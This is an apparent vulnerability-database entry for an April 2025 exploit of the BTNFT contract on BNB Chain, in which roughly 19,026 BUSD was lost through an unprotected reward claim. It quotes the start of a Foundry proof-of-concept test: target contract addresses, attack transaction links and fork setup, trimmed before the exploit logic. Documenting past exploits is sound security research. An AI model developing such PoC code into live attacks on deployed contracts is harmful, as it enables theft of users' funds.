# [?] BTNFT - Claim Rewards Without Protection

## Summary
Severity: Unknown
Chain: BNB Chain
Component: BTNFT
Published: 2025-04-18
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-04/BTNFT_exp.sol
Type: defi-exploit-poc

## Details
Lost: 19025.9193312786235214 BUSD

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : 19025.9193312786235214 BUSD
// Original Attacker : https://bscscan.com/address/0xbda2a27cdb2ffd4258f3b1ed664ed0f28f9e0fc3
// Attack Contract : https://bscscan.com/address/0x7A4D144307d2DFA2885887368E4cd4678dB3c27a
// Vulnerable Contract : https://bscscan.com/address/0x0FC91B6Fea2E7A827a8C99C91101ed36c638521B#code
// First Attack Tx(Claim Rewards) : https://bscscan.com/tx/0x1e90cbff665c43f91d66a56b4aa9ba647486a5311bb0b4381de4d653a9d8237d
// Second Attack Tx(Sell Tokens) : https://bscscan.com/tx/0x7978c002d12be9b748770cc31cbaa1b9f3748e4083c9f419d7a99e2e07f4d75f
// @POC Author : [rotcivegaf](https://twitter.com/rotcivegaf)

// Contracts involved
address constant router = 0x82C7c2F46C230aabc806e3A2642F8CFbdD968ED2;
address constant pair = 0x1e16070a8734B3d686E0CF035c05fBBC1ba21C98;

address constant BTNFT = 0x0FC91B6Fea2E7A827a8C99C91101ed36c638521B;
address constant BTT = 0xDAd4df3eFdb945358a3eF77B939Ba83DAe401DA8;
address constant BUSD = 0x55d398326f99059fF775485246999027B3197955;

contract BTNFT_exp is Test {
    address attacker = makeAddr("attacker");

    function setUp() public {
        vm.createSelectFork("bsc", 48472356 - 1);
    }

    function testPoC() public {
        vm.startPrank(attacker);

        AttackerC attC = new AttackerC();

        attC.attackTx1();
```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-04/BTNFT_exp.sol_
